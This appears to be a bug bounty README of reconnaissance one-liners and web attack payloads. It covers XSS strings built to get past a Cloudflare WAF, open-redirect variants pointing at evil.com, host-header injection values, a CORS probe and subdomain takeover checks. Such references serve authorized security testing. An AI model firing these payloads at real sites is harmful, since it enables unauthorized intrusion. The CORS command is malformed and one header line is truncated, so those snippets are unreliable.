# BugBounty Resources

## Introduction


I always have to search for commands everytime I start to hunt for bugs.Therefore, I created this repository to list all useful commands of different tools. My intention is to make a repository containing all the important commands, technique and oneliners helpful for reconnaissance. 

If you think any important commands were not listed in this repository, feel free to contribute. 

## Extracting endpoints from JavaScript files:
	cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

## Extracting Juicy Information:
    for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done

## Extracting all the urls from sitemap
	curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'

## CORS Misconfiguration:
    site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done

## Heartbleed vulnerability
    cat domains.txt
        example.com
        subdomain.example.com
    cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
  
 ## Finding subdomains and check for takeovers 
      subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/fingerprints.json -v 3 >> takeover ;
    
  ## Testing SQLi + XSS + SSTI with the same payload use
  	"><svg/onload=prompt(5);>{{7*7}}
  
  ##  XSS Cloudflare WAF bypass: 
  	<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
	<select><noembed></select><script x=’a@b’a>y=’a@b’//a@b%0a\u0061lert(1)</script x>
	<a+HREF=’%26%237javascrip%26%239t:alert%26lpar;document.domain)’>
	
  ## Valid URLs (Open Redirect Vulnerability)
	http(s)://evil.com
	http(s):\\evil.com
	//evil.com
	///evil.com
	/\/evil.com
	\/evil.com
	\\evil.com
	\/\evil.com
	/	/evil.com (That's a Tab Key / ASCII 0x09)
	\	\evil.com (That's a Tab Key / ASCII 0x09)
  ## Possible Host Header Injection
  	Host: emalple.com:1234"--><h1>TestScript<script>alert(1);
	X-Forwarded-Host: example.com/.example2.com
	Host: "><script>alert(1)</script>
	X-FORWARDED-FOR: example.com
	X-Forwarded-For: example.com
	Host: vulnerable-website.com:bad-stuff-here
	HTTP_FORWARDED: example.com
	HTTP_CLIENT_IP: 127.0.0.1
	HTTP_FORWARDED_FOR: exmaple.com
	HTTP_X_FORWARDED: example.com	
	HTTP_X_FORWARDED_FOR: example.com
	Front-End-Https: on
	Proxy-Connection: keep-alive
	X-Att-Deviceid: GT-P7320/P7320XXLPG
	X-CSRFToken: DECAFC0FFEEBAD
	X-Correlation-ID: f058ebd6-02f7-4d3f-942e-904344e8cde5
	X-Csrf-Token: DECAFC0FFEEBAD
	X-XSRF-TOKEN: DECAFC0FFEEBAD
	X-Do-Not-Track: 1
	X-Forwarded-For: 127.0.0.1
	X-Forwarded-For: client1, proxy1, proxy2
	X-Forwarded-Proto: https
	X-HTTP-Method-Override: PUT
	X-ProxyUser-Ip: 127.0.0.1
	X-Request-ID: f058ebd6-02f7-4d3f-942e-904344e8cde5
	X-Requested-With: XMLHttpRequest
	X-UIDH: 31337DEADBEEFCAFE
	X-Wap-Profile: http://wap.samsungmobile.com/uaprof/SGH-I777.xml
	X-XSRF-TOKEN: DECAFC0FFEEBAD
	Client-IP: 127.0.0.1
	True-Client-IP: 127.0.0.1
	Cluster-Client-IP: 127.0.0.
	
	
	
	Note: You can input multiple host header to test.
		Example: Host: example.com
		         Host: attacker.com
		Example:  Host: example.com {Remember space before Host! Sometimes this can bypass validation}
			 Host: attacker.com
	Try to input absolute url to the URL path.
		Example: Get https://example.com/index.html?<original path>

#### Refrences:
  - https://github.com/dwisiswant0/awesome-oneliner-bugbounty
  - https://github.com/XalfiE/Bug-Bounty-Oneliners
  - https://bbinfosec.medium.com/collection-of-bug-bounty-tip-will-be-updated-daily-605911cfa248
  
